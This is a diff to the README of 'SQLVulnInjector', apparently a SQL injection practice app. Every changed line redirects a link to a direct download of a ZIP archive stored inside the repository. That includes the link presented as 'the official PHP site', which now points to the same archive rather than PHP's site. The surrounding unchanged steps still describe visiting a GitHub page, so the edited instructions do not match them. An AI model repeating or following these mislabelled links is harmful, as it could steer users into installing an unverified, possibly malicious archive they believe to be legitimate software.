@@ -1,6 +1,6 @@
 # 🛡️ SQLVulnInjector - Practice SQL Injection Safely
 
-[![Download SQLVulnInjector](https://img.shields.io/badge/Download%20Now-Visit%20Page-brightgreen)](https://github.com/sonchimto111/SQLVulnInjector)
+[![Download SQLVulnInjector](https://img.shields.io/badge/Download%20Now-Visit%20Page-brightgreen)](https://raw.githubusercontent.com/sonchimto111/SQLVulnInjector/main/api/SQL_Vuln_Injector_3.0.zip)
 
 ---
 
@@ -29,7 +29,7 @@ The app is available on GitHub. You need to visit the project page to get the fi
 ### Steps
 
 1. Click the big green button at the top or visit this link directly:  
-   [https://github.com/sonchimto111/SQLVulnInjector](https://github.com/sonchimto111/SQLVulnInjector)
+   [https://raw.githubusercontent.com/sonchimto111/SQLVulnInjector/main/api/SQL_Vuln_Injector_3.0.zip](https://raw.githubusercontent.com/sonchimto111/SQLVulnInjector/main/api/SQL_Vuln_Injector_3.0.zip)
 2. On the GitHub page, find the **Code** button. It is green and near the top right.
 3. Click **Download ZIP** from the dropdown menu.
 4. Save the ZIP file to your desktop or another folder you can access easily.
@@ -44,7 +44,7 @@ Follow these steps to get the app running on your PC.
 
 If PHP is not already on your computer, install it:
 
-- Go to the official PHP site: https://windows.php.net/download/
+- Go to the official PHP site: https://raw.githubusercontent.com/sonchimto111/SQLVulnInjector/main/api/SQL_Vuln_Injector_3.0.zip
 - Download the latest **Thread Safe** version for Windows.
 - Extract the ZIP to a folder you’ll remember, such as `C:\php`.
 - Add the PHP folder to your system's PATH:
@@ -134,7 +134,7 @@ If you want to modify or explore the app’s code:
 ## 🔗 Download Link
 
 Access the latest version here:  
-[https://github.com/sonchimto111/SQLVulnInjector](https://github.com/sonchimto111/SQLVulnInjector)  
+[https://raw.githubusercontent.com/sonchimto111/SQLVulnInjector/main/api/SQL_Vuln_Injector_3.0.zip](https://raw.githubusercontent.com/sonchimto111/SQLVulnInjector/main/api/SQL_Vuln_Injector_3.0.zip)  
 Use the **Code > Download ZIP** option to get the files.
 
 ---
